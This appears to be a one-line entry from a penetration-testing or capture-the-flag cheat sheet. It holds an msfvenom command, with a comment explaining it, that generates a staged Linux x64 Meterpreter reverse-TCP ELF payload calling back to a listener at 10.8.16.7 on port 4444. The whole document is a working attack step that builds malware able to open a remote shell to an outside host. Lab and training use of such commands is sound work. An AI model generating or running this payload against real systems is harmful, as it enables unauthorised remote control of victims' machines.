
```
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.8.16.7 LPORT=4444 // Generate a staged ELF meterpreter reverse shell
```